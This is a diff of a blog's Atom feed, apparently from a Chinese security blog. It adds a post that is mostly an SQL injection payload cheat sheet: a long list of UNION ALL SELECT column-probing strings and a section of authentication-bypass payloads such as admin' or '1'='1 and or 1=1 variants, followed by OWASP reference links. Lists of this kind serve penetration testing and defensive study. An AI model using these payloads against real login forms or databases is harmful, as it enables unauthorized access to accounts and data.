+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;sql-injection-auth-bypass-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-injection-auth-bypass-payloads&#34;&gt;#&lt;/a&gt; SQL Injection Auth Bypass Payloads&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&#39;-&#39;
+&#39; &#39;
+&#39;&amp;amp;&#39;
+&#39;^&#39;
+&#39;*&#39;
+&#39; or &#39;&#39;-&#39;
+&#39; or &#39;&#39; &#39;
+&#39; or &#39;&#39;&amp;amp;&#39;
+&#39; or &#39;&#39;^&#39;
+&#39; or &#39;&#39;*&#39;
+&amp;quot;-&amp;quot;
+&amp;quot; &amp;quot;
+&amp;quot;&amp;amp;&amp;quot;
+&amp;quot;^&amp;quot;
+&amp;quot;*&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;-&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot; &amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;&amp;amp;&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;^&amp;quot;
+&amp;quot; or &amp;quot;&amp;quot;*&amp;quot;
+or true--
+&amp;quot; or true--
+&#39; or true--
+&amp;quot;) or true--
+&#39;) or true--
+&#39; or &#39;x&#39;=&#39;x
+&#39;) or (&#39;x&#39;)=(&#39;x
+&#39;)) or ((&#39;x&#39;))=((&#39;x
+&amp;quot; or &amp;quot;x&amp;quot;=&amp;quot;x
+&amp;quot;) or (&amp;quot;x&amp;quot;)=(&amp;quot;x
+&amp;quot;)) or ((&amp;quot;x&amp;quot;))=((&amp;quot;x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin&#39; --
+admin&#39; #
+admin&#39;/*
+admin&#39; or &#39;1&#39;=&#39;1
+admin&#39; or &#39;1&#39;=&#39;1&#39;--
+admin&#39; or &#39;1&#39;=&#39;1&#39;#
+admin&#39; or &#39;1&#39;=&#39;1&#39;/*
+admin&#39;or 1=1 or &#39;&#39;=&#39;
+admin&#39; or 1=1
+admin&#39; or 1=1--
+admin&#39; or 1=1#
+admin&#39; or 1=1/*
+admin&#39;) or (&#39;1&#39;=&#39;1
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;--
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;#
+admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*
+admin&#39;) or &#39;1&#39;=&#39;1
+admin&#39;) or &#39;1&#39;=&#39;1&#39;--
+admin&#39;) or &#39;1&#39;=&#39;1&#39;#
+admin&#39;) or &#39;1&#39;=&#39;1&#39;/*
+1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
+admin&amp;quot; --
+admin&amp;quot; #
+admin&amp;quot;/*
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot; or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+admin&amp;quot;or 1=1 or &amp;quot;&amp;quot;=&amp;quot;
+admin&amp;quot; or 1=1
+admin&amp;quot; or 1=1--
+admin&amp;quot; or 1=1#
+admin&amp;quot; or 1=1/*
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot;) or (&amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;--
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;#
+admin&amp;quot;) or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;/*
+1234 &amp;quot; AND 1=0 UNION ALL SELECT &amp;quot;admin&amp;quot;, &amp;quot;81dc9bdb52d04dc20036dbd8313ed055
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;references&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#references&#34;&gt;#&lt;/a&gt; References :&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection ( OWASP )&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u&#34;&gt;https://www.owasp.org/index.php/SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Blind SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u&#34;&gt;https://www.owasp.org/index.php/Blind_SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Testing for SQL Injection (OTG-INPVAL-005)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=&#34;&gt;https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Bypassing WAF&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=&#34;&gt;https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Reviewing Code for SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==&#34;&gt;https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PL/SQL:SQL Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==&#34;&gt;https://www.owasp.org/index.php/PL/SQL:SQL_Injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Testing for NoSQL injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=&#34;&gt;https://www.owasp.org/index.php/Testing_for_NoSQL_injection&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Injection Prevention Cheat Sheet&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s&#34;&gt;https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SQL Injection Query Parameterization Cheat Sheet&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;👉 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=&#34;&gt;https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="sql注入" />
+        <category term="payload" />
+        <updated>2020-12-30T09:38:30.000Z</updated>
+    </entry>
+</feed>
